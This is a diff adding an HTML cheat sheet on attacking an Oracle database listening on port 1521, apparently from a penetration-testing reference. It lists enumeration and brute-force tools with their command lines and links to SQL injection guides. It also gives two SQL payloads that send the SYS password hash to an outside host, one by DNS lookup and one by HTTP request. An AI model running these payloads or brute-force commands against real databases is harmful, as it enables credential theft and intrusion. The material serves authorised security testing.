@@ -1,0 +1,109 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Oracle</title>
+</head><body>Oracle Port 1521 Open<br/>
+•  Oracle Enumeration<ul><li style="list-style-type: none">• oracsec </li>
+<li style="list-style-type: none">• Repscan </li>
+<li style="list-style-type: none">• Sidguess </li>
+<li style="list-style-type: none">• Scuba </li>
+<li style="list-style-type: none">• DNS/HTTP Enumeration </li>
+</ul>
+<ul><ul>• SQL&gt; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL</ul>
+</ul>
+<ul><ul>• SQL&gt; select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;</ul>
+</ul>
+<ul><li style="list-style-type: none">• WinSID </li>
+<li style="list-style-type: none">• Oracle default password list </li>
+<li style="list-style-type: none">• TNSVer </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• tnsver host [port]</li>
+</ul>
+</li>
+<li style="list-style-type: none">• TCP Scan </li>
+<li style="list-style-type: none">• Oracle TNSLSNR </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]</li>
+</ul>
+</li>
+<li style="list-style-type: none">• TNSCmd </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• perl tnscmd.pl -h ip_address</li>
+<li style="list-style-type: none">• perl tnscmd.pl version -h ip_address</li>
+<li style="list-style-type: none">• perl tnscmd.pl status -h ip_address</li>
+<li style="list-style-type: none">• perl tnscmd.pl -h ip_address --cmdsize (40 - 200)</li>
+</ul>
+</li>
+<li style="list-style-type: none">• LSNrCheck </li>
+<li style="list-style-type: none">• Oracle Security Check (needs credentials) </li>
+<li style="list-style-type: none">• OAT </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• sh opwg.sh -s ip_address</li>
+<li style="list-style-type: none">• opwg.bat -s ip_address</li>
+<li style="list-style-type: none">• sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID</li>
+</ul>
+</li>
+<li style="list-style-type: none">• OScanner </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• sh oscanner.sh -s ip_address</li>
+<li style="list-style-type: none">• oscanner.exe -s ip_address</li>
+<li style="list-style-type: none">• sh reportviewer.sh oscanner_saved_file.xml</li>
+<li style="list-style-type: none">• reportviewer.exe oscanner_saved_file.xml</li>
+</ul>
+</li>
+<li style="list-style-type: none">• NGS Squirrel for Oracle </li>
+<li style="list-style-type: none">• Service Register </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• Service-register.exe ip_address</li>
+</ul>
+</li>
+<li style="list-style-type: none">• PLSQL Scanner 2008 </li>
+</ul>
+•  Oracle Brute Force<ul><li style="list-style-type: none">• OAK </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• ora-getsid hostname port sid_dictionary_list</li>
+<li style="list-style-type: none">• ora-auth-alter-session host port sid username password sql</li>
+<li style="list-style-type: none">• ora-brutesid host port start</li>
+<li style="list-style-type: none">• ora-pwdbrute host port sid username password-file</li>
+<li style="list-style-type: none">• ora-userenum host port sid userlistfile</li>
+<li style="list-style-type: none">• ora-ver -e (-f -l -a) host port</li>
+</ul>
+</li>
+<li style="list-style-type: none">• breakable (Targets Application Server Port) </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose</li>
+</ul>
+</li>
+<li style="list-style-type: none">• SQLInjector (Targets Application Server Port) </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL</li>
+<li style="list-style-type: none">• sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Check Password </li>
+<li style="list-style-type: none">• orabf </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• orabf [hash]:[username] [options]</li>
+</ul>
+</li>
+<li style="list-style-type: none">• thc-orakel </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• Cracker</li>
+<li style="list-style-type: none">• Client</li>
+<li style="list-style-type: none">• Crypto</li>
+</ul>
+</li>
+<li style="list-style-type: none">• DBVisualisor </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• Sql scripts from pentest.co.uk </li>
+<li style="list-style-type: none">• Manual sql input of previously reported vulnerabilties</li>
+</ul>
+</li>
+</ul>
+•  Oracle Reference Material<ul><li style="list-style-type: none">• Understanding SQL Injection </li>
+<li style="list-style-type: none">• SQL Injection walkthrough </li>
+<li style="list-style-type: none">• SQL Injection by example </li>
+<li style="list-style-type: none">• Advanced SQL Injection in Oracle databases </li>
+<li style="list-style-type: none">• Blind SQL Injection </li>
+<li style="list-style-type: none">• SQL Cheatsheets</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• http://ha.ckers.org/sqlinjection</li>
+<li style="list-style-type: none">• http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</li>
+<li style="list-style-type: none">• http://www.0x000000.com/?i=14</li>
+</ul>
+</li>
+</ul>
+<ul><ul>• http://pentestmonkey.net/?</ul>
+</ul>
+<br/>
+<br/>
+<br/>
+&nbsp;</body></html>
